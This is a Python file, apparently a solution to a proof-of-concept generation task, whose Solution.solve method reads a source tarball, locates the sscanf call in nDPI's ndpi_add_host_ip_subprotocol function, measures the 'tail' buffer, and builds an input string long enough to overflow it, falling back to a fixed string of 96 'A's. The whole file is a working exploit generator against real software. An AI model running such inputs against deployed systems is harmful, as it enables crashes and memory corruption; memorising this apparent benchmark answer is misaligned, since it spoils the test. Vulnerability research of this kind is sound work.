import tarfile
import re


def _parse_c_string_literal(s: str):
    start = s.find('"')
    if start == -1:
        return None
    i = start + 1
    out_chars = []
    length = len(s)

    while i < length:
        c = s[i]
        if c == '\\':
            if i + 1 >= length:
                break
            nxt = s[i + 1]
            if nxt in "'\"\\?":
                out_chars.append(nxt)
                i += 2
            elif nxt == 'n':
                out_chars.append('\n')
                i += 2
            elif nxt == 'r':
                out_chars.append('\r')
                i += 2
            elif nxt == 't':
                out_chars.append('\t')
                i += 2
            elif nxt == 'v':
                out_chars.append('\v')
                i += 2
            elif nxt == 'a':
                out_chars.append('\a')
                i += 2
            elif nxt == 'b':
                out_chars.append('\b')
                i += 2
            elif nxt == 'f':
                out_chars.append('\f')
                i += 2
            elif nxt in '01234567':
                j = i + 1
                oct_digits = []
                for _ in range(3):
                    if j < length and s[j] in '01234567':
                        oct_digits.append(s[j])
                        j += 1
                    else:
                        break
                if oct_digits:
                    try:
                        out_chars.append(chr(int(''.join(oct_digits), 8)))
                    except ValueError:
                        pass
                    i = j
                else:
                    i += 1
            elif nxt == 'x':
                j = i + 2
                hex_digits = []
                while j < length and s[j] in '0123456789abcdefABCDEF':
                    hex_digits.append(s[j])
                    j += 1
                if hex_digits:
                    try:
                        out_chars.append(chr(int(''.join(hex_digits), 16)))
                    except ValueError:
                        pass
                    i = j
                else:
                    i += 2
            else:
                out_chars.append(nxt)
                i += 2
        elif c == '"':
            return ''.join(out_chars)
        else:
            out_chars.append(c)
            i += 1
    return ''.join(out_chars)


def _split_arguments(arg_str: str):
    args = []
    cur = []
    in_str = False
    escape = False
    depth = 0
    for ch in arg_str:
        if in_str:
            cur.append(ch)
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == '"':
                in_str = False
            continue
        if ch == '"':
            in_str = True
            cur.append(ch)
            continue
        if ch in '([{':
            depth += 1
        elif ch in ')]}':
            if depth > 0:
                depth -= 1
        elif ch == ',' and depth == 0:
            arg = ''.join(cur).strip()
            if arg:
                args.append(arg)
            cur = []
            continue
        cur.append(ch)
    if cur:
        arg = ''.join(cur).strip()
        if arg:
            args.append(arg)
    return args


def _parse_scanf_format(fmt: str):
    conversions = []
    i = 0
    length_fmt = len(fmt)

    while i < length_fmt:
        c = fmt[i]
        if c != '%':
            i += 1
            continue
        if i + 1 < length_fmt and fmt[i + 1] == '%':
            i += 2
            continue

        spec_start = i
        i += 1

        assign_suppr = False
        if i < length_fmt and fmt[i] == '*':
            assign_suppr = True
            i += 1

        width = None
        start_w = i
        while i < length_fmt and fmt[i].isdigit():
            i += 1
        if i > start_w:
            try:
                width = int(fmt[start_w:i])
            except ValueError:
                width = None

        length_mod = ''
        if i < length_fmt and fmt[i] in 'hljztL':
            if fmt[i] in 'hl' and i + 1 < length_fmt and fmt[i + 1] == fmt[i]:
                length_mod = fmt[i:i + 2]
                i += 2
            else:
                length_mod = fmt[i]
                i += 1

        # Optional GNU 'm' allocation modifier
        alloc = False
        while i < length_fmt and fmt[i] == 'm':
            alloc = True
            i += 1

        if i >= length_fmt:
            break

        conv_char = fmt[i]
        conv = {
            'conv': conv_char,
            'assign_suppr': assign_suppr,
            'width': width,
            'length': length_mod,
            'alloc': alloc,
            'start': spec_start,
            'end': i,
        }

        if conv_char == '[':
            j = i + 1
            if j < length_fmt and fmt[j] == ']':
                j += 1
            while j < length_fmt and fmt[j] != ']':
                j += 1
            set_content = fmt[i + 1:j]
            conv['set'] = set_content
            conv['end'] = j
            i = j

        conversions.append(conv)
        i += 1

    return conversions


def _process_literal_segment(segment: str):
    res = []
    i = 0
    length = len(segment)
    while i < length:
        c = segment[i]
        if c == '%' and i + 1 < length and segment[i + 1] == '%':
            res.append('%')
            i += 2
        else:
            res.append(c)
            i += 1
    return ''.join(res)


def _choose_char_for_scanset(spec: str):
    if spec is None:
        return 'A'
    inside = spec
    negated = False
    idx = 0
    if inside and inside[0] == '^':
        negated = True
        idx = 1

    allowed = set()
    i = idx
    prev_char = None
    length = len(inside)

    while i < length:
        ch = inside[i]
        if (
            ch == '-'
            and prev_char is not None
            and i + 1 < length
            and inside[i + 1] != ']'
        ):
            start_ord = ord(prev_char)
            end_ord = ord(inside[i + 1])
            if start_ord <= end_ord:
                for code in range(start_ord, end_ord + 1):
                    allowed.add(chr(code))
            else:
                for code in range(end_ord, start_ord + 1):
                    allowed.add(chr(code))
            prev_char = None
            i += 2
            continue
        else:
            allowed.add(ch)
            prev_char = ch
            i += 1

    if not negated:
        if allowed:
            return next(iter(allowed))
        return 'A'
    else:
        banned = allowed
        for candidate in ['A', 'a', '0', '1', ' ', '?', ',', '.', 'x', 'y', 'z']:
            if candidate not in banned:
                return candidate
        for code in range(32, 127):
            ch = chr(code)
            if ch not in banned:
                return ch
        return 'B'


def _build_input_from_scanf(fmt: str, conversions, tail_arg_index: int, tail_length: int):
    result_parts = []
    current_pos = 0
    arg_index = -1

    for conv in conversions:
        start = conv['start']
        end = conv['end']

        if start > current_pos:
            literal = fmt[current_pos:start]
            if literal:
                result_parts.append(_process_literal_segment(literal))
        current_pos = end + 1

        if not conv['assign_suppr']:
            arg_index += 1

        is_tail = (not conv['assign_suppr'] and arg_index == tail_arg_index)
        conv_char = conv['conv']
        width = conv['width']

        token = ''
        if conv_char in 'diouxX':
            token = '1'
        elif conv_char in 'eEfFgGaA':
            token = '1.0'
        elif conv_char == 'c':
            w = width if width is not None and width > 0 else 1
            if is_tail:
                w2 = max(w, tail_length)
                token = 'X' * w2
            else:
                token = 'Y' * w
        elif conv_char == 's':
            if is_tail:
                token = 'Z' * max(tail_length, 2)
            else:
                small = width if width is not None and width < 8 else 1
                token = 'w' * max(small, 1)
        elif conv_char == '[':
            set_spec = conv.get('set', '')
            ch = _choose_char_for_scanset(set_spec)
            if is_tail:
                token = ch * max(tail_length, 2)
            else:
                small = width if width is not None and width < 8 else 1
                token = ch * max(small, 1)
        elif conv_char == 'p':
            token = '0x1'
        elif conv_char == 'n':
            token = ''
        else:
            token = '1'

        result_parts.append(token)

    if current_pos < len(fmt):
        literal = fmt[current_pos:]
        if literal:
            result_parts.append(_process_literal_segment(literal))

    return ''.join(result_parts)


def _extract_function_text(source_code: str, func_name: str):
    pattern = re.compile(r'\b' + re.escape(func_name) + r'\s*\([^)]*\)\s*\{', re.S)
    m = pattern.search(source_code)
    if not m:
        return None
    brace_start = source_code.find('{', m.start())
    if brace_start == -1:
        return None
    depth = 1
    i = brace_start + 1
    length = len(source_code)
    while i < length and depth > 0:
        c = source_code[i]
        if c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
        i += 1
    if depth != 0:
        return None
    return source_code[m.start():i]


def _extract_sscanf_call_with_tail(func_text: str):
    idx = func_text.find('sscanf')
    length = len(func_text)
    while idx != -1:
        open_idx = func_text.find('(', idx)
        if open_idx == -1:
            return None
        depth = 1
        i = open_idx + 1
        while i < length and depth > 0:
            c = func_text[i]
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
            i += 1
        if depth != 0:
            return None
        call_inside = func_text[open_idx + 1:i - 1]
        if 'tail' in call_inside:
            return call_inside
        idx = func_text.find('sscanf', i)
    return None


def _extract_tail_buf_size(func_text: str):
    m = re.search(r'\b(?:char|u_int8_t|uint8_t)\s+tail\s*\[\s*(\d+)\s*\]', func_text)
    if m:
        try:
            return int(m.group(1))
        except ValueError:
            pass
    m = re.search(r'\btail\s*\[\s*(\d+)\s*\]', func_text)
    if m:
        try:
            return int(m.group(1))
        except ValueError:
            pass
    return None


def _default_poc_bytes():
    s = "1 1 " + ("A" * 96) + "\n"
    return s.encode('ascii')


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                ndpi_source = None
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if not name.endswith(('.c', '.h')):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        content = f.read().decode('utf-8', 'ignore')
                    except Exception:
                        continue
                    if 'ndpi_add_host_ip_subprotocol' in content:
                        ndpi_source = content
                        break
        except Exception:
            return _default_poc_bytes()

        if ndpi_source is None:
            return _default_poc_bytes()

        func_text = _extract_function_text(ndpi_source, 'ndpi_add_host_ip_subprotocol')
        if func_text is None:
            return _default_poc_bytes()

        call_inside = _extract_sscanf_call_with_tail(func_text)
        if call_inside is None:
            return _default_poc_bytes()

        args = _split_arguments(call_inside)
        if len(args) < 3:
            return _default_poc_bytes()

        fmt_str = _parse_c_string_literal(args[1])
        if not fmt_str:
            return _default_poc_bytes()

        dest_args = args[2:]
        tail_arg_index = None
        for idx, arg in enumerate(dest_args):
            if re.search(r'\btail\b', arg):
                tail_arg_index = idx
                break
        if tail_arg_index is None:
            return _default_poc_bytes()

        conversions = _parse_scanf_format(fmt_str)
        if not conversions:
            return _default_poc_bytes()

        non_suppressed = [c for c in conversions if not c['assign_suppr']]
        if not non_suppressed:
            return _default_poc_bytes()

        if tail_arg_index >= len(non_suppressed):
            return _default_poc_bytes()

        buf_size = _extract_tail_buf_size(func_text)
        if buf_size is None:
            buf_size = 64

        if buf_size < 512:
            tail_length = buf_size + 32
        else:
            tail_length = buf_size + 32
        if tail_length < 80:
            tail_length = 80

        poc_str = _build_input_from_scanf(fmt_str, conversions, tail_arg_index, tail_length)
        if not poc_str.endswith("\n"):
            poc_str += "\n"
        try:
            return poc_str.encode('ascii', 'ignore')
        except Exception:
            return _default_poc_bytes()